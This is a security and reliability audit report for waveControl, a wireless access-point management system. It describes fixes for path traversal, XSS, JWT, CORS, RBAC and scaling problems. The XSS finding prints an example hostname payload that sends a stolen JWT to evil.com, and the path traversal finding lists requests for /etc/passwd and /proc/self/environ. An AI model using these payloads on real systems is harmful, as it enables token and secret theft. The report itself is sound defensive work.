# waveControl Audit Report

Generated: 2024-12-24

## Summary

Comprehensive audit of memory usage, resource cleanup, consistency, socket handling, and reliability.

**Status:** All issues fixed. System scaled for 2000 APs / 20000 STAs.

---

## Security Fixes

### 1. Timing Attack Prevention [FIXED] FIXED

**Problem:** `verifyPassword` used direct comparison, leaking timing info.

**Fix:** Changed to `subtle.ConstantTimeCompare()` for constant-time comparison.

### 2. JWT Algorithm Substitution [FIXED] FIXED

**Problem:** AuthMiddleware didn't verify JWT signing method.

**Fix:** Added signing method verification to prevent algorithm substitution attacks:
```go
if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
    return nil, fmt.Errorf("unexpected signing method")
}
```

### 3. JSON Decode Error Handling [FIXED] FIXED

**Problem:** Many endpoints ignored JSON decode errors, leading to default values.

**Fix:** All JSON decode calls now return 400 on parse error:
- AddDevice, BulkAddDevices
- UpgradeDevice, UpgradeFanout, BulkUpgrade
- CreateUser, UpdateUser, UpdateSetting
- CreateSite, UpdateSite
- CreateRegion, UpdateRegion

### 4. Database Query Error Handling [FIXED] FIXED

**Problem:** Several DB queries ignored errors, risking nil pointer panics.

**Fix:** Added error handling with proper HTTP responses:
- Search, ListLogs - return 500 on query error
- ListUsers, ListRoles, ListSettings - return 500 on query error
- Scan errors logged and rows skipped

### 5. WebSocket Token in Query Params (Documented)

**Note:** Query params for WebSocket auth may appear in logs. Mitigations:
- WebSocket upgrade is immediate (token not sent repeatedly)
- Tokens are short-lived (24h)
- Header auth preferred when possible
- Added comment documenting the tradeoff

---

## Scale Analysis (2000 APs, 20000 STAs)

### Memory Estimates

| Component | Per-Unit | Count | Total |
|-----------|----------|-------|-------|
| DeviceStats (APs) | ~1.2 KB | 2,000 | 2.4 MB |
| DeviceStats (STAs) | ~1.2 KB | 20,000 | 24 MB |
| PeerStats in APs | ~950 B | 20,000 | 19 MB |
| MAC->IP lookup | ~50 B | 22,000 | 1.1 MB |
| Circuit breaker state | ~50 B | 2,000 | 100 KB |
| HTTP conn pool | ~10 KB | 500 | 5 MB |
| Rate limiter | ~100 B | 10,000 | 1 MB |
| **Total** | | | **~53 MB** |

OpenBSD default datasize limit: 512 MB [FIXED]

### Resource Configuration

| Resource | Default | Scaled | Notes |
|----------|---------|--------|-------|
| Worker threads | 10 | 50 | 40 APs/worker/30s cycle |
| Job queue | 100 | 2,500 | Full cycle buffer |
| HTTP idle conns | 100 | 500 | 0.25 per AP |
| HTTP conns/host | unlimited | 4 | Prevent device overload |
| DB connections | 25 | 100 | ~2 per worker |
| DB idle conns | 5 | 25 | Reduce reconnects |
| Request timeout | 30s | 15s | Faster failure detection |

---

## Fixed Issues

### 1. Stats Store Memory Leak [FIXED] FIXED

**Problem:** STAs never removed from in-memory store.

**Fix:**
- Added `staleTimeout` (5 min default)
- `CleanStale()` removes STAs not seen recently
- Called every 5 poll cycles (~2.5 min)

### 2. Database Rows Not Deferred [FIXED] FIXED

**Problem:** `rows.Close()` not deferred in login handler.

**Fix:** Added defer and error handling.

### 3. WebSocket Hub No Exit [FIXED] FIXED

**Problem:** `Hub.Run()` had no context cancellation.

**Fix:** Added context parameter, graceful client cleanup on shutdown.

### 4. Rate Limiter Unbounded [FIXED] FIXED

**Problem:** IP map could grow indefinitely under attack.

**Fix:**
- Added `maxClients = 10000` cap
- New IPs rejected when at capacity
- Cleanup runs twice per window instead of once

### 5. Poller Logging [FIXED] FIXED

**Problem:** All logs went to syslog regardless of mode.

**Fix:**
- Added `logDebug()` method to Poller
- Debug flag passed via Config
- Routine logs now debug-only
- Critical logs (queue full, errors) always logged

### 6. No Circuit Breaker [FIXED] FIXED

**Problem:** Failing devices polled at full rate, wasting resources.

**Fix:**
- Circuit breaker per device IP
- After 3 failures: exponential backoff (1->2->4->8->15 min max)
- Success resets breaker
- Manual refresh bypasses breaker
- Old entries cleaned every 10 poll cycles

### 7. Error Handling Inconsistent [FIXED] FIXED

**Problem:** Some errors silently ignored with `_`.

**Fix:** Added error handling or debug logging for all ignored errors.

---

## Architecture for Scale

### Polling at Scale

```
2000 APs / 50 workers = 40 APs/worker
40 APs x 0.5s average = 20s per worker cycle
Leaves 10s margin in 30s interval [FIXED]
```

### Circuit Breaker Behavior

```go
// Failures trigger exponential backoff
failures=1,2: no backoff (transient)
failures=3: 1 min backoff  
failures=4: 2 min backoff
failures=5: 4 min backoff
failures=6: 8 min backoff
failures=7+: 15 min max backoff

// Example: 100 devices offline
// Without breaker: 100 x 15s timeout = 25 min wasted/cycle
// With breaker: 100 x 0s (skipped) = 0s wasted/cycle
```

### Memory Management

```go
// Stats store cleanup
CleanStale() runs every 5 cycles
Removes STAs not seen for 5 minutes
Prevents unbounded growth from transient devices

// Circuit breaker cleanup  
cleanCircuitBreakers() runs every 10 cycles
Removes entries older than 30 minutes
```

---

## Configuration Recommendations

### PostgreSQL (postgresql.conf)

```ini
# For 100 wavecontrol connections + other apps
max_connections = 200

# Shared memory for caching
shared_buffers = 256MB

# Work memory for sorting
work_mem = 8MB
```

### OpenBSD (/etc/login.conf)

```
daemon:\
    :datasize=1024M:\
    :maxproc=512:\
    :openfiles=4096:\
    :tc=default:
```

### Recommended Settings (database)

```sql
INSERT INTO settings (key, value) VALUES
  ('poll_interval', '30'),
  ('poller_workers', '50');
```

---

## Socket/Connection Summary

| Component | Max FDs | Cleanup |
|-----------|---------|---------|
| HTTP client pool | 500 idle | IdleTimeout 90s |
| Per-host limit | 4 active | Auto |
| DB connections | 100 open | ConnMaxLife 5m |
| Zabbix listener | 1 + clients | defer Close |
| WebSocket clients | 1 per client | defer Close |

---

## What's Good

[FIXED] Connection pooling properly configured  
[FIXED] All response bodies closed with defer  
[FIXED] Mutex usage consistent (RWMutex where appropriate)  
[FIXED] Context propagation throughout  
[FIXED] Graceful shutdown with signal handling  
[FIXED] Worker pool pattern for polling  
[FIXED] Circuit breaker prevents resource waste  
[FIXED] Stale entry cleanup prevents memory leaks  
[FIXED] Rate limiter prevents DoS  
[FIXED] Scaled for 20,000+ devices


---

## Additional Security Fixes (Phase 2)

### 6. Unsafe Claims Type Assertions [FIXED] FIXED

**Problem:** Direct type assertions `r.Context().Value(claimsKey).(*Claims)` could panic.

**Fix:** Changed all to use safe `getClaims(r)` helper with nil check:
- WebSocket
- CreateJob, CancelJob
- BackupConfig, RestoreConfig, BulkBackup, BatchConfig
- GenerateReport

### 7. CORS AllowCredentials with Wildcard [FIXED] FIXED

**Problem:** `AllowOrigins: "*"` with `AllowCredentials: true` violates CORS spec.

**Fix:** Set `AllowCredentials: false` - Bearer tokens don't need credentials mode.

### 8. Missing Security Headers [FIXED] FIXED

**Added:**
- `Content-Security-Policy`
- `Referrer-Policy`
- `Permissions-Policy`
- (HSTS commented - for reverse proxy TLS termination)

### 9. Path Traversal in RestoreConfig [FIXED] FIXED

**Problem:** `strings.HasPrefix(absPath, backupPath)` could be bypassed with `backups-malicious/`.

**Fix:**
- Use `filepath.Clean(backupPath) + string(filepath.Separator)` for prefix check
- Resolve symlinks with `filepath.EvalSymlinks`
- Validate backup path is absolute
- Read from validated path, not user-provided path

### 10. IPv6 in Directory Paths [FIXED] FIXED

**Problem:** IPv6 addresses contain colons which are invalid in filesystem paths.

**Fix:** Added `sanitizeIPForPath()` that replaces colons with dashes:
- BackupConfig
- BulkBackup
- ListConfigs

### 11. Circuit Breaker Premature Reset [FIXED] FIXED

**Problem:** `pollDeviceWave` returned `true` even when stats fetch failed, causing circuit breaker reset.

**Fix:** Introduced `pollResult` enum:
- `pollNotThisType` - Device doesn't respond to this API
- `pollFailed` - Device responded but poll failed (triggers circuit breaker)
- `pollSuccess` - Full success (resets circuit breaker)

### 12. RebootDevice Wrong API [FIXED] FIXED

**Problem:** Used AirOS cookie auth for Wave devices that use x-auth-token header.

**Fix:** Try Wave API first (x-auth-token), fall back to AirMAX (cookie) on failure.

### 13. MkdirAll Error Handling [FIXED] FIXED

**Problem:** `os.MkdirAll` errors were ignored in BulkBackup.

**Fix:** Added error checking with proper result reporting.

---

## Phase 3 Fixes

### 14. Scheduler Job Concurrency [FIXED] FIXED

**Problems:**
- No limit on concurrent jobs (could saturate system)
- Race condition: multiple instances could grab same job
- Jobs marked running after fetch, not atomically

**Fixes:**
- Added semaphore limiting concurrent jobs to 5
- Use `FOR UPDATE SKIP LOCKED` in query (PostgreSQL row locking)
- Atomic job claiming via `UPDATE...WHERE status='pending' RETURNING`
- `claimJob()` returns false if job already taken

```go
// Only claim if still pending - prevents duplicate execution
err := db.QueryRow(`
    UPDATE scheduled_jobs 
    SET status = 'running'
    WHERE id = $1 AND status = 'pending'
    RETURNING ...
`, jobID).Scan(...)
```

### 15. CancelJob Return Value [FIXED] FIXED

Now returns error if job not found or not pending (was silently succeeding).

### 16. Frontend Chain Value Handling [FIXED] FIXED

**Problem:** `if (chains[0])` was falsy for 0 values; `-65` is truthy but `0` is falsy.

**Fix:** Use explicit type checks:
```javascript
// Before (bug)
if (c0Cell && chains[0]) { ... }

// After (correct)
if (c0Cell && typeof chains[0] === 'number') { ... }
```

Also fixed `get5GHzCombined` filter:
```javascript
// Before: chains.filter(c => c && c < 0)  // 0 filtered out
// After:  chains.filter(c => typeof c === 'number' && c < 0)
```

### 17. Token Storage Documentation [FIXED] DOCUMENTED

localStorage is acceptable for internal tools. Added security comment with alternatives:
- sessionStorage for session-only tokens
- HttpOnly cookies for XSS protection
- Added `isExpired()` helper for client-side expiry check

---

## JSON Decode Behavior (Clarification)

The JSON decode error handling is intentionally strict:
- **Malformed JSON** -> 400 (syntax errors like missing quotes)
- **Type mismatches** -> 400 (string where number expected)
- **Missing optional fields** -> OK (get zero values, then defaults applied)

This is correct behavior. Go's `json.Decoder` is already lenient about missing fields. The 400 errors only trigger for actual parse failures, not missing optional data.

---

## Summary

| Category | Issues Fixed |
|----------|--------------|
| Security | 10 (timing, JWT, CORS, headers, path traversal, claims, etc.) |
| Reliability | 8 (query errors, JSON decode, circuit breaker, mkdir, etc.) |
| Concurrency | 3 (scheduler locking, semaphore, cancel) |
| Frontend | 2 (chain values, token docs) |
| **Total** | **23 issues** |

---

## CRITICAL: Static File Path Traversal [FIXED] FIXED

**Severity:** CRITICAL - Arbitrary file read

**Vulnerability:**
```go
path := filepath.Join(webRoot, r.URL.Path)  // BUG!
http.ServeFile(w, r, path)
```

When `r.URL.Path` starts with `/` (which it always does), `filepath.Join` treats it as absolute:
- `filepath.Join("/var/web", "/etc/passwd")` -> `/etc/passwd`

**Attack vectors:**
- `GET /etc/passwd` -> Reads system password file
- `GET /proc/self/environ` -> Leaks environment variables (DB URLs, JWT secrets!)
- `GET /var/wavecontrol/wavecontrol.db` -> Database dump

**Fix:**
1. Strip leading `/` to make path relative
2. Join with webRoot
3. Use `filepath.Abs()` to resolve both paths
4. Verify result stays under webRoot with prefix check

```go
relPath := strings.TrimPrefix(filepath.Clean(r.URL.Path), "/")
fullPath := filepath.Join(webRoot, relPath)
absWebRoot, _ := filepath.Abs(webRoot)
absFullPath, _ := filepath.Abs(fullPath)

// CRITICAL: Must be under webRoot
if !strings.HasPrefix(absFullPath, absWebRoot+string(filepath.Separator)) {
    // Traversal attempt - serve index.html
    return
}
```

**Note:** Symlinks within webRoot are followed (by design - admin controls webRoot contents).

---

## CRITICAL: Config Backup/Restore Nil Pointer Crashes [FIXED] FIXED

**Severity:** CRITICAL - Server crash on config backup/restore

**Vulnerabilities:**
1. **Missing URL scheme**: `login(ip, ...)` was called with just IP, but function expected `https://ip`
2. **Ignored errors**: `req, _ := http.NewRequest(...)` ignores error, returns nil
3. **Nil pointer panic**: `req.Header.Set(...)` panics on nil request
4. **Wrong auth header**: Used `Cookie: AIROS_SESSIONID=...` but Wave API uses `x-auth-token`

**Affected functions:**
- `FetchConfig()` - config backup
- `PushConfig()` - config restore  
- `ApplyConfig()` - batch config
- `RebootDevice()` - reboot
- `doUpgrade()` - firmware upgrade
- Poller: `login()`, `fetchStats()`, `checkStaticInfo()`

**Fixes applied:**
1. Changed `login(host, ...)` to accept host and build URL internally
2. All `http.NewRequest()` calls now check errors
3. Changed `Cookie: AIROS_SESSIONID=...` to `x-auth-token` header for Wave API
4. Fixed callers to pass IP (not baseURL) to login

**Before (broken):**
```go
token, _ := s.login(ip, user, pass)        // ip="192.168.1.1", login expects URL
req, _ := http.NewRequest("GET", url, nil)  // Ignored error
req.Header.Set("Cookie", "AIROS_SESSIONID="+token)  // Wrong header, nil panic
```

**After (fixed):**
```go
// login now builds https://host internally
token, err := s.login(ip, user, pass)
if err != nil { return err }

req, err := http.NewRequest("GET", url, nil)
if err != nil { return fmt.Errorf("create request: %w", err) }
req.Header.Set("x-auth-token", token)  // Correct Wave API auth
```

---

## SQL Precedence Bug (Already Fixed)

**Issue:** Original SQL had wrong operator precedence:
```sql
WHERE status = 'pending' 
  AND (next_run IS NULL AND scheduled_at <= $1)
   OR (next_run IS NOT NULL AND next_run <= $1)
```

**Problem:** AND binds tighter than OR, so this was parsed as:
```sql
WHERE (status='pending' AND next_run IS NULL AND scheduled_at<=now)
   OR (next_run IS NOT NULL AND next_run<=now)
```

This allowed **any job** with `next_run <= now` to be selected regardless of status - cancelled, failed, running, or completed jobs could be re-executed!

**Fix:** Added outer parentheses around the OR clause:
```sql
WHERE status = 'pending' 
  AND ((next_run IS NULL AND scheduled_at <= $1)
   OR (next_run IS NOT NULL AND next_run <= $1))
```

Now `status = 'pending'` is correctly ANDed with the entire time condition.

**Status:** [FIXED] Fixed in current version (applied during scheduler rewrite)

---

## Correctness Bug: Scheduler device_ids Type Mismatch [FIXED] FIXED

**Problem:**
- Schema: `scheduled_jobs.device_ids INTEGER[]` (PostgreSQL array)
- Code: `json.Marshal(deviceIDs)` produces `[1,2,3]` (JSON array)
- PostgreSQL expects `{1,2,3}` format for INTEGER[]

**Result:** Job creation would fail or corrupt data.

**Fix:**
- Use `pq.Array()` for writing: `pq.Array(deviceIDs)`
- Use `pq.Int64Array` for reading, then convert to `[]int`
- Removed manual `parseIntArray()` workaround

**Before:**
```go
deviceIDsJSON, _ := json.Marshal(deviceIDs)  // [1,2,3] - wrong!
db.QueryRow("INSERT... VALUES ($1, ...)", deviceIDsJSON)
```

**After:**
```go
db.QueryRow("INSERT... VALUES ($1, ...)", pq.Array(deviceIDs))  // {1,2,3} - correct!
```

**Reading:**
```go
var deviceIDs pq.Int64Array
rows.Scan(..., &deviceIDs, ...)
job.DeviceIDs = make([]int, len(deviceIDs))
for i, id := range deviceIDs {
    job.DeviceIDs[i] = int(id)
}
```

---

## CRITICAL: XSS via Device-Controlled Fields [FIXED] FIXED

**Severity:** CRITICAL - Account takeover via JWT theft

**Vulnerability:**
Device hostnames and other fields rendered via innerHTML without escaping:
```javascript
container.innerHTML = `<span>${device.hostname}</span>`
// If hostname is: <img src=x onerror="fetch('https://evil.com/?t='+localStorage.wavecontrol_token)">
// -> JWT token stolen, full account compromise
```

**Attack scenario:**
1. Attacker controls a device (or compromises one)
2. Sets hostname to `<script>...</script>` or `<img onerror=...>`
3. Admin opens dashboard
4. Malicious JS executes in admin's browser
5. JWT token stolen from localStorage
6. Attacker has full API access

**Affected locations:**
- `components.js`: renderTree(), renderDeviceDetail()
- `app.js`: map popups, topology view, reports tables, backup lists, upgrade modal, bulk add results

**Fix:**
Added `escapeHTML()` and `escapeAttr()` helpers to both files:
```javascript
function escapeHTML(str) {
  if (str === null || str === undefined) return ''
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
```

Applied escaping to all device-controlled fields:
- hostname, ip_address, mac
- product, model, platform, flavor
- firmware, firmware_version
- ssid, net_mode
- site_name, region_name
- Backup paths, firmware filenames
- Upgrade results, bulk add results

**Fields NOT escaped (safe):**
- Numeric IDs (server-generated integers)
- Signal values, capacities (server-calculated numbers)
- Status classes (hardcoded strings like 'online'/'offline')
- Timestamps (Date objects)

---

## Panic: Nil rows.Close() in Inventory Report [FIXED] FIXED

**Problem:**
```go
rows, _ := a.DB.Query(...)  // Error ignored!
defer rows.Close()          // PANIC if rows is nil
```

If query fails (connection issue, syntax error), rows is nil, and `defer rows.Close()` panics.

**Location:** `cmd/server/api.go` line ~1509 (inventory report generation)

**Fix:**
```go
rows, err := a.DB.Query(...)
if err != nil {
    http.Error(w, "inventory query failed", 500)
    return
}
defer rows.Close()
```

Also added error handling for `rows.Scan()` inside the loop.

**Audit of other locations:** All other `defer rows.Close()` calls properly check errors first or are inside else blocks after nil checks.

---

## CORS Configuration Made Secure by Default [FIXED] FIXED

**Problem:**
```go
AllowedOrigins:   []string{"*"},
AllowCredentials: true,  // Browser blocks this combination anyway
```

Even with `AllowCredentials: false`, wildcard origins are overly permissive for production.

**Fix:**
Made CORS configurable via `cors_origins` setting:

| Setting Value | Behavior |
|---------------|----------|
| `""` (empty, default) | No CORS headers - same-origin only |
| `"*"` | Allow all origins (development mode) |
| `"https://app.example.com"` | Allow single origin |
| `["https://app.example.com", "https://admin.example.com"]` | Allow multiple origins |

**Default is now secure** - no CORS headers means browsers enforce same-origin policy.

**Production setup:**
```sql
UPDATE settings SET value = '["https://wavecontrol.example.com"]' WHERE key = 'cors_origins';
```

**Development setup:**
```sql
UPDATE settings SET value = '*' WHERE key = 'cors_origins';
```

**Note:** `AllowCredentials` is `false` since we use Bearer tokens in Authorization header, not cookies.

---

## WebSocket Origin Validation Added [FIXED] FIXED

**Problem:**
```go
CheckOrigin: func(r *http.Request) bool {
    return true // Allow all origins
}
```

WebSocket connections bypass CORS. Any website could open a WebSocket to steal real-time data if they obtained a token.

**Fix:**
Added origin validation to WebSocket hub matching CORS policy:

1. Added `allowedOrigins` field to Hub struct
2. Added `SetAllowedOrigins()` method
3. Implemented `checkOrigin()` that validates against allowed list
4. Main.go configures WebSocket with same origins as CORS

**Origin validation logic:**
```go
func (h *Hub) checkOrigin(r *http.Request) bool {
    origin := r.Header.Get("Origin")
    
    // No origin = same-origin request (allowed)
    if origin == "" {
        return true
    }
    
    // No allowed origins configured = same-origin only
    if len(allowed) == 0 {
        return originURL.Host == r.Host
    }
    
    // Check against explicit list or wildcard
    for _, a := range allowed {
        if a == "*" || strings.EqualFold(origin, a) {
            return true
        }
    }
    
    log.Printf("WebSocket: rejected origin %q", origin)
    return false
}
```

**Configuration:** Uses same `cors_origins` setting as HTTP CORS:
- Empty (default): same-origin only
- `"*"`: allow all (development)
- `["https://app.example.com"]`: specific origins

---

## RBAC Enforcement Added [FIXED] FIXED

**Problem:**
Roles existed in schema but weren't enforced. Any authenticated user could:
- Delete devices
- Upgrade firmware
- Modify configurations
- View sensitive settings (passwords)

**Solution:**
Implemented four permission levels with proper enforcement:

| Role | Permissions |
|------|-------------|
| `viewer` | Read-only: list devices, stats, reports, logs |
| `creator` | viewer + add devices |
| `editor` | creator + delete devices, upgrade, jobs, backup/restore, sites/regions |
| `administrator` | editor + user management, settings |

**Helper functions added:**
```go
func (a *API) hasRole(r *http.Request, role string) bool
func (a *API) hasAnyRole(r *http.Request, roles ...string) bool
func (a *API) canView(r *http.Request) bool     // viewer+
func (a *API) canCreate(r *http.Request) bool   // creator+
func (a *API) canEdit(r *http.Request) bool     // editor+
func (a *API) isAdmin(r *http.Request) bool     // administrator only
func (a *API) requireView/Create/Edit/Admin(w, r) bool  // Returns 403 if denied
```

**Endpoints protected:**

| Permission | Endpoints |
|------------|-----------|
| `creator` | AddDevice, BulkAddDevices |
| `editor` | DeleteDevice, UpgradeDevice, UpgradeFanout, BulkUpgrade, CreateJob, CancelJob, BackupConfig, RestoreConfig, BulkBackup, BatchConfig, GenerateReport, CreateSite, UpdateSite, DeleteSite, CreateRegion, UpdateRegion, DeleteRegion |
| `admin` | ListUsers, CreateUser, UpdateUser, DeleteUser, UpdateSetting |

**Sensitive settings filtered:**
`ListSettings` now filters these keys for non-admins:
- `default_passwords`
- `default_usernames`  
- `jwt_secret`
- `cors_origins`

**Note:** All endpoints still require authentication via AuthMiddleware. The role checks add authorization on top.

---

## Timeout Middleware Breaking WebSocket/Long Operations [FIXED] FIXED

**Problem:**
Global `chimw.Timeout(60s)` applied to all routes caused:
- WebSocket connections terminated after 60s
- Firmware upgrades cut off mid-transfer
- Bulk operations returning 504 while background work continues

**Solution:**
Removed global timeout, applied selectively per route group:

| Route Group | Timeout | Endpoints |
|-------------|---------|-----------|
| WebSocket | None | `/ws` |
| Long operations | 5 min | Upgrades, bulk-add, backup/restore, batch-config, report generation |
| Standard API | 60s | Everything else |

**Route structure:**
```go
// WebSocket - NO timeout
apiR.Group(func(ws chi.Router) {
    ws.Use(api.AuthMiddleware)
    ws.Get("/ws", api.WebSocket)
})

// Long-running (5 min timeout)
apiR.Group(func(longOps chi.Router) {
    longOps.Use(api.AuthMiddleware)
    longOps.Use(chimw.Timeout(5 * time.Minute))
    longOps.Post("/devices/{id}/upgrade", ...)
    longOps.Post("/devices/bulk-upgrade", ...)
    longOps.Post("/devices/bulk-backup", ...)
    // etc.
})

// Standard (60s timeout)
apiR.Group(func(priv chi.Router) {
    priv.Use(api.AuthMiddleware)
    priv.Use(chimw.Timeout(60 * time.Second))
    // normal endpoints
})
```

**Long operation endpoints (5 min):**
- `POST /devices/{id}/upgrade`
- `POST /devices/{id}/upgrade-fanout`
- `POST /devices/bulk-upgrade`
- `POST /devices/bulk-add`
- `POST /devices/{id}/backup`
- `POST /devices/{id}/restore`
- `POST /devices/bulk-backup`
- `POST /devices/batch-config`
- `POST /reports/generate`

---

## Scale/Performance Issues [FIXED] FIXED

### 11) Poller "queue full" break doesn't break the loop [FIXED]
**Where:** `internal/poller/poller.go` ~336
**Problem:** `break` only exits `select`, not the `for` loop. Causes infinite loop logging "queue full".
**Fix:** Added labeled break:
```go
enqueue:
  for rows.Next() {
    // ...
    select {
    case p.jobs <- job:
      queued++
    default:
      log.Printf("pollAllDevices: queue full at %d devices", queued)
      break enqueue // Break outer loop, not just select
    }
  }
```

### 12) Settings changes don't apply to poller ticker [FIXED]
**Where:** `Poller.Start()` creates ticker once, `watchConfig()` updates `p.interval` but ticker never resets.
**Fix:** Added `intervalChanged` channel:
- `intervalChanged chan time.Duration` in Poller struct
- Main loop listens for interval changes and calls `ticker.Reset(newInterval)`
- `loadConfig()` sends on channel when interval changes (non-blocking)

```go
// In Start() select loop:
case newInterval := <-p.intervalChanged:
  ticker.Reset(newInterval)
  p.logDebug("Poll interval changed to %v", newInterval)

// In loadConfig():
if seconds != p.interval {
  oldInterval := p.interval
  p.interval = seconds
  select {
  case p.intervalChanged <- seconds:
    log.Printf("Poll interval changed: %v -> %v", oldInterval, seconds)
  default:
    // Channel full, skip
  }
}
```

### 13) Stats store returns pointers that may be mutated concurrently [FIXED]
**Where:** `internal/stats/store.go` Get()/List() return `*DeviceStats`
**Problem:** Callers read fields while poller may update them -> data races.
**Fix:** Added `copy()` method that creates deep copies:

```go
func (s *DeviceStats) copy() *DeviceStats {
  if s == nil { return nil }
  cp := *s  // Shallow copy
  
  // Deep copy slices
  if len(s.CPU) > 0 { cp.CPU = make([]CPUCore, len(s.CPU)); copy(cp.CPU, s.CPU) }
  if len(s.Interfaces) > 0 { cp.Interfaces = make([]InterfaceStats, len(s.Interfaces)); copy(cp.Interfaces, s.Interfaces) }
  
  // Deep copy pointers
  if s.Orientation != nil { orient := *s.Orientation; cp.Orientation = &orient }
  
  // Deep copy Peers slice
  if len(s.Peers) > 0 {
    cp.Peers = make([]*PeerStats, len(s.Peers))
    for i, p := range s.Peers {
      if p != nil { peerCopy := *p; cp.Peers[i] = &peerCopy }
    }
  }
  return &cp
}
```

All Get/List methods now return `stats.copy()`.

### 14) UI does heavy full-refresh comparison every 30s [FIXED]
**Where:** `web/js/app.js` pollDevices() uses `JSON.stringify()` comparison
**Problem:** Expensive at scale (thousands of devices), GC churn.
**Fix:** Lightweight comparison:
- Compare device count first
- Only compare key display fields: `id`, `online`, `uptime`, `peer_count`, `firmware_version`
- Added `devicesVersion` counter to store for efficient change tracking

```javascript
// Lightweight comparison: check count and key fields
if (current.length !== devices.length) {
  needsUpdate = true
} else {
  const currentMap = new Map(current.map(d => [d.id, d]))
  for (const d of devices) {
    const c = currentMap.get(d.id)
    if (!c || c.online !== d.online || c.uptime !== d.uptime || 
        c.peer_count !== d.peer_count || c.firmware_version !== d.firmware_version) {
      needsUpdate = true
      break
    }
  }
}
```

### 15) WebSocket doesn't connect after login [FIXED]
**Where:** `web/js/app.js` - `init()` connects WS, but `doLogin()` doesn't
**Problem:** Fresh login users rely only on polling until page reload.
**Fix:** 
1. Added `ws.connect()` and `ws.startPing()` after successful login
2. Fixed `ws.startPing()` to only start once (prevent duplicate intervals):

```javascript
// In api.js ws object:
pingStarted: false,
startPing() {
  if (this.pingStarted) return
  this.pingStarted = true
  setInterval(() => { this.send({ type: 'ping' }) }, 25000)
}

// In doLogin() after store.set():
ws.connect()
ws.startPing()
```

**Files Modified:**
- `internal/poller/poller.go` - labeled break, interval change channel
- `internal/stats/store.go` - deep copy helper, return copies
- `web/js/store.js` - devicesVersion counter
- `web/js/app.js` - lightweight comparison, WS connect after login
- `web/js/api.js` - startPing guard
